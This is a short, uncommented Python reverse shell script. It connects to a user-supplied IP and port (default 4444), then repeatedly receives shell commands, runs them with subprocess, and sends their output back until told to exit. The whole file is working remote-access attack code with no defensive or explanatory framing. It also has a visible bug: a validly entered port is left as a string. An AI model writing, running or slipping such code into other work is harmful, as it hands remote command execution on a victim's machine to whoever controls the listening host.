import socket
import subprocess


server_host = str(input("Enter Target's IP address [Eg = 192.168.x.x]: "))
server_port = input("Enter Port Number[default = 4444]: ")
try:
    int(server_port)
except:
    server_port = 4444

buffer = 1024
s = socket.socket()
s.connect((server_host,server_port))
while True:
    command = s.recv(buffer).decode()
    if command.lower() == "exit":
        break
    output = subprocess.getoutput(command)
    s.send(output.encode())
s.close()